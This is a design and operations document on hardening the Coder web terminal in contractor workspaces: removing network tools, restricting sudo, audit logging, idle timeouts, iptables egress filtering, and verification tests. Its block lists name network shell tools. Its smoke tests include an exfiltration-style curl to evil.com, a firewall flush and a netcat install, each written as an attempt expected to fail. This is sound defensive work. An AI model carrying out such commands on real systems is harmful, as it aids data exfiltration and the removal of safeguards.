# Web Terminal Security Hardening

Security hardening measures for the Coder web terminal in contractor workspaces.

## Table of Contents

1. [Threat Model](#1-threat-model)
2. [P0 — Critical (Implemented)](#2-p0--critical-implemented)
3. [P1 — Important (Implemented)](#3-p1--important-implemented)
4. [P2 — Nice to Have](#4-p2--nice-to-have)
5. [What Was Considered and Rejected](#5-what-was-considered-and-rejected)
6. [Verification](#6-verification)
7. [Egress Exception Administration](#7-egress-exception-administration)
8. [Deployment](#8-deployment)

---

## 1. Threat Model

The Coder web terminal (`web_terminal = true` in `display_apps`) gives contractors a full bash shell inside their workspace container. While Coder disables SSH, SCP, and port forwarding at the platform level, the terminal itself is a potential vector for:

| Threat | Vector | Risk |
|--------|--------|------|
| **Data exfiltration** | `scp`, `sftp`, `curl` to external hosts, DNS tunneling | High |
| **Container escape** | Docker CLI with accessible socket | Critical |
| **Privilege escalation** | `sudo apt-get install` arbitrary packages | Critical |
| **Network reconnaissance** | `nmap`, `netcat`, `ping`, `dig` | Medium |
| **Unaudited activity** | No command logging, no session recording | Medium |
| **Abandoned sessions** | No idle timeout, sessions stay open indefinitely | Low |

---

## 2. P0 — Critical (Implemented)

These changes are applied in the Dockerfile (`templates/contractor-workspace/build/Dockerfile`).

### 2.1 Remove `sudo apt-get install` (Privilege Escalation)

**Before:**
```
coder ALL=(ALL) NOPASSWD: /usr/bin/apt-get install *
```

**After:** Line removed entirely.

**Why:** The wildcard allowed installing ANY package — including `netcat`, `nmap`, `socat`, `openssh-server`, etc. This completely undermined the connection lockdown (no SSH/no port forwarding) because contractors could install their own network tools.

**Remaining sudo commands (all read-only or safe):**
| Command | Purpose |
|---------|---------|
| `apt-get update` | Refresh package index (read-only) |
| `systemctl status *` | View service status (read-only) |
| `update-ca-certificates` | Trust self-signed TLS cert (needed for agent) |
| `cp /certs/* /usr/local/share/ca-certificates/` | Copy TLS certs (restricted source path) |

### 2.2 Remove Docker CLI (Container Escape)

**Before:** `docker-ce-cli` installed from Docker apt repo.

**After:** Removed entirely from Dockerfile.

**Why:** If the Docker socket is reachable (via network or mount), the Docker CLI allows full container escape — a contractor could start a privileged container with host filesystem mounted. Even without the socket, having the CLI is unnecessary attack surface.

**If Docker-in-Docker is needed later:** Use [sysbox](https://github.com/nestybox/sysbox) runtime or rootless Docker, not a mounted Docker socket.

### 2.3 Remove Dangerous Network Binaries (Data Exfiltration)

**Removed binaries:**

| Binary | Package | Risk |
|--------|---------|------|
| `ssh`, `scp`, `sftp`, `ssh-keygen`, `ssh-keyscan` | `openssh-client` | File transfer to external hosts, even with Coder SSH disabled |
| `nc`, `ncat`, `netcat` | `netcat-openbsd` | Raw socket data transfer, reverse shells |
| `telnet` | `telnet` | Unencrypted protocol, data exfiltration |
| `ftp` | `ftp` | File transfer to external hosts |
| `socat` | `socat` | Advanced socket relay, tunnel creation |
| `nmap` | `nmap` | Network port scanning, reconnaissance |

**Kept (needed for development):**

| Binary | Why Kept | Mitigation |
|--------|----------|------------|
| `curl` | Package installs, API testing, AI gateway calls | Restrict via network egress rules (P1) |
| `wget` | Package downloads, build scripts | Restrict via network egress rules (P1) |
| `git` | Core development workflow | Only reaches internal Gitea server |
| `ping` | Network debugging | Low risk (ICMP only) |
| `dig`/`nslookup` | DNS debugging | Low risk (read-only) |

### 2.4 Shell Audit Logging (Command Accountability)

**Added:** `/etc/profile.d/shell-audit.sh`

Every command typed in any terminal (web terminal or code-server terminal) is logged via `logger` to syslog with:
- Timestamp
- Username
- Working directory
- Full command
- Exit code

**Log format:**
```
Feb  7 14:23:01 workspace bash: user=coder pwd=/home/coder/workspace cmd=git push origin main [rc=0]
```

**Bash history settings:**
- `HISTTIMEFORMAT="%F %T "` — timestamps in history
- `HISTSIZE=10000` / `HISTFILESIZE=20000` — larger history retention
- `histappend` — append rather than overwrite history file

### 2.5 Idle Session Timeout (Abandoned Sessions)

**Added:** `/etc/profile.d/idle-timeout.sh`

```bash
export TMOUT=1800    # 30 minutes
readonly TMOUT       # User cannot unset it
```

After 30 minutes of no keyboard input, the shell session exits automatically. The `readonly` prevents users from running `unset TMOUT` to disable it.

---

## 3. P1 — Important (Implemented)

### 3.1 Network Egress Filtering (Implemented)

**The single most impactful P1 item.** Restricts all workspace outbound connections to approved internal services only. Uses iptables rules applied at container startup via `setup-firewall.sh`.

**How it works:**
1. `iptables` installed in Dockerfile (build time)
2. `setup-firewall.sh` script created at `/usr/local/bin/` (root-owned, not writable by coder)
3. Script added to sudoers allowlist
4. Container has `NET_ADMIN` capability for iptables
5. Entrypoint runs `sudo /usr/local/bin/setup-firewall.sh` before Coder agent starts
6. All other outbound connections are **dropped and logged** (`EGRESS_DENIED:` prefix)

**Approved destinations:**

| Destination | Port | Purpose |
|-------------|------|---------|
| `localhost` (loopback) | any | Internal container communication |
| Coder server | 7443, 7080 | Agent callback, workspace API |
| LiteLLM AI Gateway | 4000 | AI proxy |
| Gitea Git Server | 3000, 2222 | Git HTTP/SSH |
| Key Provisioner | 8100 | AI key auto-provisioning |
| DevDB PostgreSQL | 5432 | Development database |
| DevDB MySQL | 3306 | Development database |
| Authentik | 9000, 9443 | OIDC authentication |
| MinIO S3 | 9001, 9002 | Artifact storage |
| Langfuse | 3100 | AI observability |
| code-server | 8080 | Internal IDE |
| DNS | 53 | Name resolution |

**Security notes:**
- `NET_ADMIN` capability is required for iptables but the coder user cannot modify rules (iptables binary is not in sudoers)
- Denied connections are logged with `EGRESS_DENIED:` prefix for monitoring
- Script is idempotent (flushes rules before re-adding)
- `curl`/`wget` still work but ONLY to approved destinations

### 3.2 Read-Only System Paths (Deferred)

Mount `/usr`, `/etc`, `/opt` as read-only in the Docker container config. Only `/home/coder` should be writable.

**Status:** Deferred — may break `apt-get update` and `update-ca-certificates`. Requires thorough testing. Consider implementing when migrating to Kubernetes (read-only root filesystem is a native K8s feature).

### 3.3 PATH Lockdown (Implemented)

**Added:** `/etc/profile.d/path-lockdown.sh`

```bash
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin:/home/coder/.local/bin:/home/coder/.opencode/bin:/usr/local/go/bin:/usr/share/dotnet"
readonly PATH
```

Fixed PATH prevents users from adding directories to `PATH` to discover/run binaries from unexpected locations. The `readonly` prevents users from running `export PATH=...` to override it.

---

## 4. P2 — Nice to Have

### 4.1 Terminal Session Recording

Use `script` command or Coder's session recording to capture full terminal sessions (not just commands, but all output). Critical for forensics and compliance.

### 4.2 Command Allowlisting (AppArmor)

Deploy an AppArmor profile that restricts which executables can run:

```
# Allow only approved binaries
/usr/bin/git rix,
/usr/bin/python3* rix,
/usr/bin/node rix,
/usr/bin/npm rix,
/usr/local/go/bin/go rix,
# Deny everything else
deny /usr/bin/** x,
```

### 4.3 Disable `dnsutils` and `iputils-ping`

These are useful for debugging but also enable network reconnaissance. Consider removing from the base image and providing a "debug" workspace template variant that includes them.

---

## 5. What Was Considered and Rejected

### rbash (Restricted Bash)

**Rejected.** While `rbash` prevents `cd`, PATH changes, and output redirection, it:
- Breaks core development workflow (can't navigate projects)
- Is trivially escaped via `vim`, `python`, `node`, or any editor that spawns subshells
- Provides false sense of security

The better approach is defense-in-depth: remove dangerous binaries (P0) + restrict network egress (P1) + audit logging (P0).

### Removing curl/wget

**Rejected.** These are essential for development (package installs, API testing, build scripts). Restricting network egress (P1) is more effective — let them use `curl` but only to approved destinations.

---

## 6. Verification

### Automated Test Script (Recommended)

Run the automated test suite against a running workspace container:

```bash
cd coder-poc
./scripts/test-terminal-security.sh                    # auto-detect workspace container
./scripts/test-terminal-security.sh coder-user1-ws1    # specify container name
```

The script validates all P0 and P1 measures: sudoers restrictions, binary removal, Docker CLI, audit logging, idle timeout, iptables firewall, PATH lockdown, and development tool availability.

### Manual verification after rebuilding the image:

```bash
# Verify dangerous binaries are removed
docker exec <workspace> which ssh scp sftp nc netcat nmap socat
# Should return: not found for all

# Verify sudo is restricted
docker exec <workspace> sudo -l -U coder
# Should show ONLY: apt-get update, systemctl status, update-ca-certificates, cp /certs/*

# Verify Docker CLI is absent
docker exec <workspace> which docker
# Should return: not found

# Verify audit logging is active
docker exec <workspace> bash -l -c 'echo $PROMPT_COMMAND'
# Should contain: logger -p local6.debug

# Verify idle timeout
docker exec <workspace> bash -l -c 'echo $TMOUT'
# Should return: 1800

# Verify TMOUT is readonly
docker exec <workspace> bash -l -c 'unset TMOUT 2>&1'
# Should return: bash: unset: TMOUT: cannot unset: readonly variable

# Verify openssh-client not installed
docker exec <workspace> dpkg -l openssh-client 2>&1
# Should return: no packages found / not installed
```

### P1 verification (network egress + PATH):

```bash
# Verify iptables rules are active
docker exec <workspace> sudo iptables -L OUTPUT -n --line-numbers
# Should show: ACCEPT rules for approved ports, DROP as default

# Verify egress to unapproved destinations is blocked
docker exec -u coder <workspace> curl -s --max-time 5 https://example.com
# Should timeout/fail (port 443 not in allowed list)

# Verify egress to approved destinations works
docker exec -u coder <workspace> curl -s http://litellm:4000/health
# Should return: {"status":"healthy"}

# Verify PATH is readonly
docker exec <workspace> bash -l -c 'export PATH="/tmp:$PATH" 2>&1'
# Should return: bash: PATH: readonly variable

# Verify PATH contains only approved directories
docker exec <workspace> bash -l -c 'echo $PATH'
# Should return the fixed PATH from path-lockdown.sh
```

### Quick smoke test:

```bash
# Test: contractor cannot install packages
docker exec -u coder <workspace> sudo apt-get install netcat-openbsd
# Should return: "Sorry, user coder is not allowed to execute..."

# Test: contractor cannot use docker
docker exec -u coder <workspace> docker ps
# Should return: "bash: docker: command not found"

# Test: contractor cannot reach external hosts
docker exec -u coder <workspace> curl -s --max-time 5 https://evil.com/exfil
# Should timeout (blocked by iptables)

# Test: contractor cannot modify firewall rules
docker exec -u coder <workspace> sudo iptables -F OUTPUT
# Should return: "Sorry, user coder is not allowed to execute..."
```

---

## 7. Egress Exception Administration

When a contractor or project needs access to services not in the default allowlist (e.g., internal Nexus, corporate npm registry, partner APIs), admins can grant exceptions through two mechanisms.

### Method 1: Workspace Parameter (Per-Workspace, Quick)

Use the `egress_extra_ports` workspace parameter in the Coder template. This is the easiest approach for simple port-based exceptions.

**Admin workflow:**
1. Contractor opens a ticket: "I need access to internal Nexus on port 8081"
2. Admin verifies the request is legitimate and the destination is internal
3. Admin navigates to Coder → Workspaces → [workspace] → Settings
4. Sets `Network Egress Exceptions` to `8081` (or `8081,8443` for multiple)
5. Contractor restarts their workspace (startup script re-applies firewall with new ports)

**Example values:**
| Request | Parameter Value |
|---------|----------------|
| Internal Nexus (port 8081) | `8081` |
| Corporate npm registry (HTTPS) | `443` |
| Nexus + npm + Kafka | `8081,443,9092` |

**Limitations:** Port-only (no IP/CIDR filtering). Port `443` would allow HTTPS to any host on the Docker network. For IP-specific rules, use Method 2.

### Method 2: Exception Files (Two-Layer: Global + Template-Specific)

The firewall script loads two exception files in order, giving admins a clear hierarchy:

| File | Scope | Location | Who Manages |
|------|-------|----------|-------------|
| `/etc/egress-global.conf` | **All workspaces, all templates** | `coder-poc/egress/global.conf` | Platform Admin |
| `/etc/egress-template.conf` | **This template's workspaces only** | `coder-poc/egress/contractor-workspace.conf` | Template Admin |

Both files are mounted read-only into every workspace container. Global rules load first, then template rules.

**Use global for:** Corporate-wide services every developer needs (Nexus, npm registry, monitoring agent, LDAP).

**Use template for:** Project-specific services (partner APIs, staging environments, team databases, Kafka clusters).

**Admin workflow:**
1. Edit the appropriate file:
   - `coder-poc/egress/global.conf` for environment-wide
   - `coder-poc/egress/contractor-workspace.conf` for template-specific
2. Commit to git (audit trail)
3. Affected workspaces restart to pick up changes (files are mounted read-only)

**Rule format (same for both files):**

| Format | Description | Example |
|--------|-------------|---------|
| `port:<port>` | Allow TCP to any host on this port | `port:9092` |
| `host:<ip>` | Allow all TCP to specific IP | `host:10.0.5.20` |
| `host:<ip>:port:<port>` | Allow TCP to specific IP + port | `host:10.0.5.20:port:8081` |
| `cidr:<cidr>` | Allow all TCP to CIDR range | `cidr:10.100.0.0/16` |
| `cidr:<cidr>:port:<port>` | Allow TCP to CIDR + specific port | `cidr:10.100.0.0/16:port:443` |

**Example global.conf (corporate services):**
```conf
# Internal Nexus artifact repository
host:10.0.5.20:port:8081
# Corporate npm registry proxy
host:10.0.5.30:port:443
# Monitoring agent endpoint
host:10.0.5.50:port:9090
```

**Example contractor-workspace.conf (project services):**
```conf
# Partner API subnet for this project
cidr:10.100.0.0/16:port:443
# Team staging environment
host:10.0.10.5:port:8080
```

### Method Comparison

| Aspect | Workspace Parameter | Global Exception File | Template Exception File |
|--------|-------------------|-----------------------|------------------------|
| **Granularity** | Port-only | IP, CIDR, IP+port | IP, CIDR, IP+port |
| **Scope** | Per-workspace | All workspaces, all templates | All workspaces in this template |
| **Who can set** | Template Admin (Coder UI) | Platform Admin (file) | Template Admin (file) |
| **Takes effect** | Workspace restart | Workspace restart | Workspace restart |
| **Audit trail** | Coder audit log | Git commit history | Git commit history |
| **Best for** | Quick one-off requests | Corporate-wide services | Project-specific services |

### Recommended Process

1. **All exception requests go through a ticket** (ServiceNow, Jira, etc.)
2. Admin verifies: Is the destination internal? Is the port legitimate?
3. For simple port exceptions: use workspace parameter (Method 1)
4. For IP-specific or org-wide exceptions: use exception file (Method 2)
5. **Denied connections are logged** — admin can review `EGRESS_DENIED:` entries to find legitimate requests being blocked
6. **Periodic review**: Audit active exceptions quarterly and remove stale ones

---

## 8. Deployment

These changes require a **Docker image rebuild** and **template push**.

```bash
# 1. Rebuild workspace image
cd coder-poc/templates/contractor-workspace/build
docker build -t contractor-workspace:latest .

# 2. Push updated template
cd coder-poc
coder templates push contractor-workspace --yes

# 3. Existing workspaces
# - Users click "Update" in Coder UI (Dockerfile change requires update, not just restart)
# - Files in /home/coder are preserved (persistent volume)
```

**Impact on existing workspaces:**
- Dockerfile changes require workspace **Update** (not just restart)
- All files in `/home/coder` are preserved (Docker volume persists)
- No data loss — this is a container image change, not a volume change

---

## Related Documents

- [Enterprise Feature Review](ENTERPRISE-FEATURE-REVIEW.md)
- [Security Guide](SECURITY.md)
- [PoC Security Review](POC-SECURITY-REVIEW.md)
- [FAQ](FAQ.md)

---

*Last updated: February 7, 2026*
